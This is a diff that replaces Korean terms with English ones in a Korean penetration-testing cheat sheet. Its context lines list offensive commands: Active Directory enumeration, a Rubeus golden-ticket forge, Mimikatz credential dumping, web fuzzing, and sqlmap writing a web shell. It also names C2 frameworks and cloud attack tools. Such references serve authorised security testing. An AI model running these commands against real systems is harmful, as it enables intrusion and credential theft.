@@ -89,7 +89,7 @@ Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? {$_.ActiveDirector
 # 로컬 관리자 탐색
 Find-LocalAdminAccess  # 현재 사용자가 로컬 관리자인 호스트 탐색
 
-# 세션 열거
+# session 열거
 Get-NetSession -ComputerName DC01
 Get-NetLoggedOn -ComputerName TARGET
 
@@ -322,7 +322,7 @@ Windows Kerberos 공격 도구 (.NET).
 # Golden Ticket
 .\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:admin /ptt
 
-# 현재 세션 티켓 조회
+# 현재 session 티켓 조회
 .\Rubeus.exe triage
 .\Rubeus.exe klist
 
@@ -337,7 +337,7 @@ Windows Kerberos 공격 도구 (.NET).
 
 ## Mimikatz
 
-Windows 자격 증명 덤프 및 조작 도구.
+Windows credential 덤프 및 조작 도구.
 
 ```powershell
 # 기본 실행
@@ -444,22 +444,22 @@ hashcat -m 1000 hash.txt --show
 ### ffuf
 
 ```bash
-# 디렉토리 퍼징
+# directory 퍼징
 ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
 # 파일 퍼징
 ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.txt,.bak
 
-# 서브도메인 퍼징
+# subdomain 퍼징
 ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE
 
-# 파라미터 퍼징
+# parameter 퍼징
 ffuf -u http://TARGET/page?FUZZ=test -w params.txt -fs SIZE
 
 # POST 데이터 퍼징
 ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fc 401
 
-# 헤더 추가
+# header 추가
 ffuf -u http://TARGET/FUZZ -w wordlist.txt -H "Cookie: session=abc123"
 
 # 필터/매치
@@ -469,13 +469,13 @@ ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301 -fc 404 -fs 0
 ### Gobuster
 
 ```bash
-# 디렉토리
+# directory
 gobuster dir -u http://TARGET -w wordlist.txt -t 50
 
 # 파일 확장자
 gobuster dir -u http://TARGET -w wordlist.txt -x php,asp,txt -t 50
 
-# 서브도메인
+# subdomain
 gobuster dns -d domain.com -w subdomains.txt -t 50
 
 # VHOST
@@ -494,7 +494,7 @@ sqlmap -u "http://TARGET/page?id=1" --batch
 # POST 요청
 sqlmap -u "http://TARGET/login" --data "user=admin&pass=test" --batch
 
-# 쿠키/헤더 포함
+# cookie/header 포함
 sqlmap -u "http://TARGET/page?id=1" --cookie "session=abc" --batch
 
 # DB 열거
@@ -519,7 +519,7 @@ sqlmap -u "http://TARGET/page?id=1" --file-write="shell.php" --file-dest="/var/w
 # 유용한 확장 프로그램
 - Autorize         : 권한 상승 테스트 자동화
 - JSON Web Tokens  : JWT 분석/조작
-- Param Miner      : 숨겨진 파라미터 탐색
+- Param Miner      : 숨겨진 parameter 탐색
 - Active Scan++    : 스캔 기능 강화
 - Turbo Intruder   : 고속 Intruder
 - Logger++         : 상세 로그
@@ -527,7 +527,7 @@ sqlmap -u "http://TARGET/page?id=1" --file-write="shell.php" --file-dest="/var/w
 # Intruder Payload 위치
 §PAYLOAD§ 로 마킹
 
-# Match & Replace 규칙으로 헤더 자동 조작
+# Match & Replace 규칙으로 header 자동 조작
 ```
 
 ---
@@ -619,7 +619,7 @@ echo "BASE64_DATA" | base64 -d > /tmp/file
 | `Sliver` | Go 기반 C2 프레임워크 | [GitHub](https://github.com/BishopFox/sliver) |
 | `Havoc` | C2 프레임워크 | [GitHub](https://github.com/HavocFramework/Havoc) |
 | `CrackStation` | 온라인 해시 룩업 | [crackstation.net](https://crackstation.net) |
-| `PayloadsAllTheThings` | 페이로드 치트시트 모음 | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) |
+| `PayloadsAllTheThings` | payload 치트시트 모음 | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) |
 | `SecLists` | 워드리스트 모음 | [GitHub](https://github.com/danielmiessler/SecLists) |
 
 ---
@@ -635,7 +635,7 @@ echo "BASE64_DATA" | base64 -d > /tmp/file
 
 | 도구 | 용도 | 예시 |
 |------|------|------|
-| `subfinder` | 서브도메인 수집 | `subfinder -d example.com -all -o subs.txt` |
+| `subfinder` | subdomain 수집 | `subfinder -d example.com -all -o subs.txt` |
 | `dnsx` | 대량 DNS 확인 | `dnsx -l subs.txt -resp-only -o alive.txt` |
 | `httpx` | 대량 HTTP 핑거프린팅 | `httpx -l alive.txt -status-code -title -tech-detect -o web.txt` |
 | `naabu` | 대량 포트 스캔 | `naabu -list alive.txt -top-ports 1000 -o ports.txt` |
@@ -651,7 +651,7 @@ echo "BASE64_DATA" | base64 -d > /tmp/file
 | `Stratus Red Team` | AWS/Azure/GCP 공격 기법 에뮬레이션 | `stratus run aws.credential-access.secretsmanager` |
 | `Prowler` | AWS 보안 점검 (CIS/머티리얼) | `prowler aws -M csv,json -S` |
 | `ScoutSuite` | 멀티클라우드 구성 감사 | `scout aws --report-dir reports/` |
-| `Pacu` | AWS 공격 프레임워크 | `pacu` → 세션 생성 후 모듈 실행 |
+| `Pacu` | AWS 공격 프레임워크 | `pacu` → session 생성 후 모듈 실행 |
 | `CloudFox` | 멀티클라우드 권한/경로 탐색 | `cloudfox enum --aws --profile prof` |
 | `kubescape` | K8s 보안 스캔 | `kubescape scan framework nsa` |
 | `kube-hunter` | K8s 공격 표면 탐색 | `kube-hunter --remote some.cluster.local` |
@@ -679,7 +679,7 @@ echo "BASE64_DATA" | base64 -d > /tmp/file
 
 | 도구 | 용도 | 예시 |
 |------|------|------|
-| `cariddi` | URL 파라미터/엔드포인트 수집 | `cat urls.txt | cariddi -plugins all -o found.txt` |
+| `cariddi` | URL parameter/endpoint 수집 | `cat urls.txt | cariddi -plugins all -o found.txt` |
 | `gau` | 과거 아카이브 URL 수집 | `echo target.com | gau --providers wayback,commoncrawl` |
 | `waybackurls` | Wayback 기반 URL 수집 | `cat domains.txt | waybackurls > urls.txt` |
 
